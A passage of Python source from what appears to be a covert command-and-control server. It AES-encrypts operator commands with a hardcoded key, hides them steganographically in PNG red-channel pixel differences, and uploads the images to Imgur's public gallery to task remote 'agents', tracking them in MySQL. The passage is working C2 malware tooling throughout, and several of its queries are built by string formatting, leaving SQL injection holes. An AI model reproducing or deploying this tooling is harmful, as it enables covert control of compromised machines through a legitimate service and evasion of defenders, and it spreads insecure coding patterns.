			elif ('exit' in inn) or ('quit' in inn):
				break
			else:
				print("\nValid Commands:")
				print("List Responses")
				print("Get Response <Agent-ID>\n")
			
	# simply uses the API to do an album creation either auth or unauth
	# unauth uses a client-id, auth uses a bearer token			
	def create_album(self, token, album_title, auth_type):
		
		url = 'https://api.imgur.com/3/album'
		if auth_type == 'Unauth':
			headers = {'Authorization': 'Client-ID ' + token}
		elif auth_type == 'Auth':
			headers = {'Authorization': 'Bearer ' + token}
		files = {'title': (None, album_title)}
		r = requests.post(url, headers=headers, files=files)
		response = r.content
		response = json.loads(response.decode())
		album_id = response.get('data', {}).get('id')
		album_deletehash = response.get('data', {}).get('deletehash')
		if r.status_code == 200:
			print("\nAlbum created successfully with Album-Hash: " + Style.BRIGHT + Fore.YELLOW + str(album_id) + Style.RESET_ALL + ", Delete-hash: " + Style.BRIGHT + Fore.YELLOW + str(album_deletehash) + Style.RESET_ALL)
			print("\n")
		else: 
			print("Album creation failed, printing response...")
			print(response)
			return

		mycursor = mydb.cursor()
		execution = "INSERT INTO Albums (Album_Hash, Delete_Hash, Auth_Type, Token) VALUES (%s, %s, %s, %s)"
		values = (album_id, album_deletehash, auth_type, token)
		try:
			mycursor.execute(execution, values)
		except mysql.connector.Error as err:
			print("Encountered MySQL error {}\n".format(err))
			sys.exit(1)

		mydb.commit()
		mycursor.close()

	# actually does the creation of the image file on disk
	# stego method explained in great detail on my blog
	def create_image(self, command, response, img_path, img_name, token, album_deletehash):
		preserved_command = command
		
		command = response.lower()[0] + "^" + token + "^" + command + "^" + str(album_deletehash)

		# pad the command to a multiple of 16 for AES encryption
		while len(command) % 16 != 0:
			command += "~"

		# key and iv can be anything you want, time to encrypt
		key = 'dali melts clock'
		iv = 'this is an iv456'
		encryption_scheme = AES.new(key, AES.MODE_CBC, iv)
		command = encryption_scheme.encrypt(command)

		# we now have an encrypted byte-object. we can now b64 it and then decode it into a utf-8 string
		command_encoded = base64.b64encode(command)
		command_encoded = command_encoded.decode("utf-8")

		# this dictionary will associate a b64 character with a binary value (in string form)
		encode_keys = {'=': '00000001', '/': '00000010', '+': '00000011', 'Z': '00000100', 'Y': '00000101', 'X': '00000110', 'W': '00000111', 'V': '00001000', 'U': '00001001', 'T': '00001010', 'S': '00001011', 'R': '00001100', 'Q': '00001101', 'P': '00001110', 'O': '00001111', 'N': '00010000', 'M': '00010001', 'L': '00010010', 'K': '00010011', 'J': '00010100', 'I': '00010101', 'H': '00010110', 'G': '00010111', 'F': '00011000', 'E': '00011001', 'D': '00011010', 'C': '00011011', 'B': '00011100', 'A': '00011101', 'z': '00011110', 'y': '00011111', 'x': '00100000', 'w': '00100001', 'v': '00100010', 'u': '00100011', 't': '00100100', 's': '00100101', 'r': '00100110', 'q': '00100111', 'p': '00101000', 'o': '00101001', 'n': '00101010', 'm': '00101011', 'l': '00101100', 'k': '00101101', 'j': '00101110', 'i': '00101111', 'h': '00110000', 'g': '00110001', 'f': '00110010', 'e': '00110011', 'd': '00110100', 'c': '00110101', 'b': '00110110', 'a': '00110111', '9': '00111000', '8': '00111001', '7': '00111010', '6': '00111011', '5': '00111100', '4': '00111101', '3': '00111110', '2': '00111111', '1': '01000000', '0': '01000001'}

		try:
			img = Image.open(img_path)
		except: 
			print("Could not locate file, restarting...\n")
			return

		pixels = img.load()

		reds = []
		for i in range(img.size[0]): # for every pixel:
		    for j in range(img.size[1]):
		        reds.append(pixels[i,j][0])

		bytez = []
		for i in reds:
			bytez.append('{:08b}'.format(i))

		differences = []
		counter = 0
		while counter < len(bytez):
			differences.append(str(abs(int(bytez[counter][7]) - int(bytez[counter + 1][7]))))
			counter += 2

		# translate our b64 encoded string into the values in our encode_keys{} dict
		translation = []
		for x in command_encoded:
			translation.append(encode_keys[x])

		# this breaks down our encoded values into individual numbers so '01010101' becomes '0', '1', '0'...
		final = []
		for x in translation:
			final += (list(x))

		# create a list of indexes that vary between final[] and differences[]
		counter = 0
		mismatch = []
		while counter < len(final):
			if final[counter] != differences[counter]:
				mismatch.append(counter)
				counter += 1
			else:
				counter += 1

		mega_counter = 0
		# at the indexes in which the organic differences and the needed differences aren't the same, change the first operand either +1 or -1
		for x in mismatch:
			if reds[x*2] == 0:
				reds[x*2] = (reds[x*2] + 1)
				mega_counter += 1
			elif reds[x*2] == 255:
				reds[x*2] = (reds[x*2] - 1)
				mega_counter += 1
			else:
				reds[x*2] = (reds[x*2] + (random.choice([-1, 1])))
				mega_counter += 1

		terminator_index = len(command_encoded) * 8 * 2
		term_diff = abs(reds[terminator_index] - reds[terminator_index + 1])
		if term_diff % 2 == 0:
			if reds[terminator_index] == 255:
				reds[terminator_index] = 254
			elif reds[terminator_index] == 0:
				reds[terminator_index] = 1
			else:
				reds[terminator_index] = reds[terminator_index] + random.choice([-1,1])

		counter = 0
		for i in range(img.size[0]): # for every pixel:
		    for j in range(img.size[1]):
		    	pixels[i,j] = (reds[counter], pixels[i,j][1], pixels[i,j][2])
		    	counter += 1

		try:
			img.save(img_name, "PNG")
			print(Style.BRIGHT + Fore.YELLOW + "\n" + str(img_name) + Style.RESET_ALL + " saved!\n")
		except:
			print(Style.BRIGHT + Fore.RED + "Image failed to save!\n" + Style.RESET_ALL)
			return

		BLOCKSIZE = 65536
		hasher = hashlib.md5()
		with open(img_name, 'rb') as afile:
		    buf = afile.read(BLOCKSIZE)
		    while len(buf) > 0:
		        hasher.update(buf)
		        buf = afile.read(BLOCKSIZE)
		
		# create/gather values to update our Pictures table in MySQL
		digest = hasher.hexdigest()
		abspath = os.path.abspath(img_name)

		mycursor = mydb.cursor()
		execution = "INSERT INTO Pictures (md5, filename, command, response, token, album_deletehash) VALUES (%s, %s, %s, %s, %s, %s)"
		values = (digest, abspath, preserved_command, response, token, album_deletehash)

		try:
			mycursor.execute(execution, values)
		except mysql.connector.Error as err:
			print("Encountered MySQL error {}\n".format(err))
			sys.exit(1)


		mydb.commit()
		mycursor.close()

	# creates the tasking by uploading our stego'd image to the gallery
	# in accordance with the options we set in the Task module
	def create_tasking(self, agent_id, title, tags, task_image, token):
		mycursor = mydb.cursor()
		execution = "SELECT filename FROM Pictures WHERE ID = {0}".format(task_image)
		mycursor.execute(execution)
		filename_tuple = mycursor.fetchall()
		mycursor.close()
		filename = filename_tuple[0][0]
		headers = {'Authorization': 'Bearer ' + token}
		files = {'image': open(filename, 'rb')}
		url = 'https://api.imgur.com/3/upload'
		r = requests.post(url, headers=headers, files=files)
		response = r.content
		response = json.loads(response.decode())
		upload_id = response.get('data', {}).get('id')
		upload_deletehash = response.get('data', {}).get('deletehash')
		if r.status_code == 200:
			print("\nImage uploaded successfully with Image-ID: " + Style.BRIGHT + Fore.YELLOW + str(upload_id) + Style.RESET_ALL + ", Delete-hash: " + Style.BRIGHT + Fore.YELLOW + str(upload_deletehash) + Style.RESET_ALL)
		else:
			print("\nImage failed to upload, printing response...\n")
			print(response)
			return

		url = 'https://api.imgur.com/3/gallery/image/' + upload_id
		headers = {'Authorization': 'Bearer ' + token}
		upload_title = title
		upload_tags = tags
		files = {'title': (None, upload_title), 'tags': (None, upload_tags)}
		r = requests.post(url, headers=headers, files=files)
		if r.status_code == 200:
			print("Image sent to Gallery successfully with Title: " + Style.BRIGHT + Fore.YELLOW + upload_title + Style.RESET_ALL + "\n")
			print("\n")
		else:
			print("\nImage failed to send to Gallery, printing response...\n")
			response = r.content
			response = json.loads(response.decode())
			print(response)
			return

		mycursor = mydb.cursor()
		execution = "INSERT INTO Tasking (Title, Tags, Tasking_Image, Agent, Response, Image_Hash, Delete_Hash, Token) VALUES (%s, %s, %s, %s, %s, %s, %s, %s)"
		response = "PENDING"
		values = (title, tags, task_image, agent_id, response, upload_id, upload_deletehash, token)
		mycursor.execute(execution, values)
		mydb.commit()

		execution = "SELECT command FROM Pictures WHERE ID = {0}".format(task_image)
		mycursor.execute(execution)
		command_tuple = mycursor.fetchall()
		command = command_tuple[0][0]

		execution = "UPDATE Tasking SET Tasking_Command = '{0}' WHERE Tasking_Image = {1}".format(command,task_image)
		mycursor.execute(execution)
		mydb.commit()

		status = 'TASKED'
		execution = "UPDATE Agents SET Status = '{0}' WHERE ID = {1}".format(status,agent_id)
		mycursor.execute(execution)
		mydb.commit()

		mycursor.close()

	def print_valid_commands(self):
		print('\nValid Commands:')
		print('Set <option> <option-value>')
		print('Options/Show Options')
		print('Reset/Reset Options')
		print('Go')
		print('Exit/Quit\n')

ascii()
mydb = mysql_check()
p = MyPrompt()
p.cmdloop()
